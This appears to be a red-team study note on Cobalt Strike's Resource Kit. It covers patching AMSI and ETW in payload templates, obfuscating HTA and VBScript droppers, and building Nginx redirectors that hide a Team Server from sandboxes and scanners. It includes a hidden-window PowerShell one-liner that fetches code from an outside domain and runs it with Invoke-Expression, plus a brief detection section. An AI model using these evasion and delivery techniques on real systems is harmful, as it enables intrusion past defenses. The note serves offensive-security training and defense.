---
tags: [cobalt-strike, malleable-c2, red-team, vapt]
difficulty: advanced
module: "96 - Cobalt Strike and Advanced Malleable C2"
topic: "96.10 Resource Kit and Web Delivery"
---

# Resource Kit and Web Delivery

## Introduction to the Resource Kit
While the Artifact Kit handles compiled executables (`.exe`, `.dll`), the **Resource Kit** is responsible for script-based payloads and web-based delivery mechanisms within Cobalt Strike. Whenever an operator uses features like the "HTML Application (HTA) Attack", "PowerShell Web Delivery", or generates VBA macros for Office documents, Cobalt Strike pulls from the templates defined in the Resource Kit.

By default, the vanilla templates provided by Cobalt Strike are heavily signature-based and are instantly caught by Antivirus (AV), the Antimalware Scan Interface (AMSI), and email gateways. Customizing the Resource Kit is essential for initial access operations, ensuring that the script-based droppers can bypass modern defenses and execute the underlying shellcode or artifact.

## Deep Dive: Modifying Resource Kit Templates

The Resource Kit contains templates for PowerShell, Python, VBA, VBScript, and HTML Applications. These templates must be modified to remove predictable variable names, logic flows, and function calls.

### PowerShell and AMSI Evasion
PowerShell is a highly monitored environment. Microsoft's AMSI intercepts the execution of PowerShell scripts and scans the content dynamically before it runs. If a default Cobalt Strike PowerShell payload is executed, AMSI will flag the embedded base64-encoded shellcode and the injection techniques used.

To customize the PowerShell templates (`template.ps1`, `compress.ps1`):
1. **AMSI Patching:** The template should be modified to include an AMSI bypass. This typically involves dynamically finding the `AmsiScanBuffer` function in `amsi.dll` and patching its memory instructions to always return a "Clean" result before the main malicious payload executes.
2. **Obfuscation:** Avoid standard base64 encoding. Use custom encoding or encryption algorithms (like AES) for the shellcode. Modify variable names dynamically using string manipulation or random generation.
3. **ETW Patching:** Similar to AMSI, Event Tracing for Windows (ETW) provides deep visibility into PowerShell execution. Advanced templates patch `EtwEventWrite` to prevent telemetry from reaching the defensive stack.

### HTML Applications (HTA) and VBScript
HTAs execute via `mshta.exe`, a legitimate Windows binary, making it a popular "Living off the Land" (LotL) execution technique. The Cobalt Strike HTA templates typically use VBScript or JScript to drop and execute a payload.

Customization involves:
- **Obfuscating COM Objects:** Default templates use obvious COM objects like `WScript.Shell`. These can be obfuscated or replaced with alternative COM objects that achieve the same result (e.g., executing via WMI).
- **Execution Flow:** Instead of executing a payload directly from the HTA, a stealthier approach involves using the HTA to write an obfuscated loader to disk or registry, and then using a scheduled task or legitimate binary proxy to execute it.

## Web Delivery Architecture and OPSEC

Generating a stealthy payload is only half the battle; delivering it safely is equally critical. Cobalt Strike includes a built-in web server to host payloads, but exposing a Team Server directly to the internet is a massive OPSEC failure.

### Redirectors and Reverse Proxies

A robust web delivery infrastructure relies on redirectors. A redirector is an intermediate server (often a cheap, disposable VPS) running a reverse proxy like Nginx, Apache, or Caddy.

1. **Traffic Forwarding:** The target requests the payload from the redirector. The redirector proxies the request to the hidden Cobalt Strike Team Server.
2. **Filtering and Conditional Routing:** This is the most crucial function. The proxy is configured with rules (e.g., using Nginx `map` directives or Apache `mod_rewrite`) to inspect incoming traffic.
   - **User-Agent Filtering:** If the request comes from a known Blue Team tool (e.g., curl, wget, Python requests) or a scanner (Shodan, Censys), the redirector drops the connection or serves a benign page (like a 404 error or a generic blog).
   - **IP Filtering:** Traffic from known datacenter IPs, security vendor subnets, or sandboxes is blocked.
   - **URI Routing:** Only specific, secret URIs are forwarded to the Team Server. All other traffic is diverted.

### Detailed Table: Reverse Proxy Redirection Logic

| Rule Type | Condition Match | Nginx Action | Resulting Impact |
| :--- | :--- | :--- | :--- |
| **Invalid URI** | URI does NOT match `/api/v1` | `return 302 https://google.com;` | Casual scanners are redirected away from the payload. |
| **Scanner IP** | Source IP belongs to Shodan AS | `return 403;` | Infrastructure is protected from automated indexing. |
| **Bad User-Agent** | `User-Agent` contains "curl" | `return 200 /fake_blog.html;` | Analysts probing the URL get served a benign webpage. |
| **Valid Request** | Matches URI, IP is OK, UA is OK | `proxy_pass https://team_server;` | Legitimate target successfully downloads the Cobalt Strike payload. |

## Custom ASCII Diagram

```text
+-----------------------------------------------------------------------------------+
|                            Advanced Web Delivery Architecture                     |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  [ Phishing Target ]                                                              |
|         | 1. Clicks link: https://cdn.legit-update.com/download/patch.hta         |
|         v                                                                         |
|  [ Nginx Redirector (VPS) ] <---- Valid SSL Certificate (Let's Encrypt)           |
|         |                                                                         |
|         |-- a. Inspect IP: Is it a known Sandbox IP? (No)                         |
|         |-- b. Inspect User-Agent: Is it an automated scanner? (No)               |
|         |-- c. Inspect URI: Matches /download/patch.hta? (Yes)                    |
|         |                                                                         |
|         |-- 2. Proxy request to hidden backend over VPN/Stunnel                   |
|         v                                                                         |
|  [ Hidden Team Server (Cobalt Strike) ]                                           |
|         |                                                                         |
|         |-- 3. Generates customized HTA payload using Resource Kit                |
|         |      (Includes AMSI bypass, obfuscated VBScript)                        |
|         |                                                                         |
|         v                                                                         |
|  [ Nginx Redirector ] ----> Returns stealthy payload to Target                    |
|                                                                                   |
|-----------------------------------------------------------------------------------|
|                                                                                   |
|  [ Blue Team / Scanner (e.g., Shodan) ]                                           |
|         | 1. Scans: https://cdn.legit-update.com/                                 |
|         v                                                                         |
|  [ Nginx Redirector ]                                                             |
|         |-- a. Inspect Request: No specific URI, User-Agent is scanner            |
|         |-- 2. Action: Redirect to https://www.google.com or return 404           |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

## Real-World Attack Scenario

### Scenario: Evading Network Sandboxes and AMSI via Smart Delivery

**Context:** The Red Team is executing an assumed-breach scenario. They need to provide the target user with a command to execute in PowerShell that will download and execute a Beacon. The network utilizes a Palo Alto firewall that intercepts and sandboxes unknown scripts, and the endpoints run a modern AV that heavily relies on AMSI.

**Execution:**
1. **Resource Kit Customization:** The operator heavily modifies the Cobalt Strike `compress.ps1` template. They integrate a robust AMSI bypass technique (memory patching `AmsiScanBuffer`) that executes prior to the shellcode runner. They also obfuscate the variable names within the template.
2. **Infrastructure Setup:** The operator sets up a domain `support-telemetry-cdn.com` and points it to an Nginx redirector. Let's Encrypt certificates are installed.
3. **Nginx Configuration:** The Nginx proxy is configured to block traffic originating from known Palo Alto sandbox IP ranges. It is also configured to only proxy requests that include a specific, secret User-Agent string.
4. **Payload Delivery:** The operator provides the target with a highly customized PowerShell one-liner:
   `powershell -w hidden -c "Invoke-WebRequest -Uri https://support-telemetry-cdn.com/api/v1 -UserAgent 'Custom-Tele-Agent-v1.2' | Invoke-Expression"`
5. **Execution and Evasion:**
   - The user executes the command.
   - The network sandbox attempts to fetch the URL to analyze it. It uses a default User-Agent and comes from a sandbox IP. Nginx drops the connection. The sandbox assumes the link is dead and allows the user's connection to proceed.
   - The user's PowerShell request reaches the redirector with the correct User-Agent. Nginx proxies the request to the Team Server.
   - The Team Server returns the customized PowerShell script (from the Resource Kit).
   - Before the payload executes, the embedded AMSI bypass patches the local `amsi.dll` in memory.
   - The shellcode runs, establishing the C2 connection without being flagged by the endpoint AV.

**Outcome:** The Red Team achieves initial access, successfully bypassing network perimeter analysis, static script analysis, and dynamic memory analysis (AMSI).

## Detection Engineering Perspective
Defending against customized script execution and smart web delivery requires correlating events across the network and endpoint.
- **Monitoring `mshta.exe` and `powershell.exe`:** Establish strict baselines for these processes. Monitor for these processes making outbound network connections, especially to newly registered or low-reputation domains.
- **Script Block Logging (Event ID 4104):** Ensure PowerShell Script Block Logging is enabled and centralized. While attackers attempt to bypass AMSI, robust logging can sometimes capture the bypass code or the obfuscated script before execution. Analyze these logs for known bypass signatures or high obfuscation entropy.
- **Hunting Malicious Redirectors:** Utilize threat intelligence to identify attacker infrastructure. Look for discrepancies in TLS certificates (e.g., certificates covering unrelated domains) or infrastructure hosted on common bulletproof hosting providers.

## Chaining Opportunities
- The shellcode delivered by these scripts relies heavily on the `stage` block for memory evasion. See [[06 - Malleable C2 PE and Memory Indicators]].
- Once the initial access script runs, the resulting C2 traffic must blend into the environment. See [[08 - Crafting Advanced Malleable C2 Profiles for OPSEC]].
- For operations requiring compiled executables instead of scripts, operators will transition to customizing the Artifact Kit. See [[09 - Artifact Kit and Payload Obfuscation]].

## Related Notes
- [[14 - Advanced PowerShell Obfuscation and AMSI Bypasses]]
- [[28 - Building Red Team Infrastructure and Redirectors]]
- [[49 - Initial Access Broker (IAB) Techniques and LotL]]
- [[96 - Cobalt Strike and Advanced Malleable C2/08 - Crafting Advanced Malleable C2 Profiles for OPSEC]]
- [[96 - Cobalt Strike and Advanced Malleable C2/09 - Artifact Kit and Payload Obfuscation]]

<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
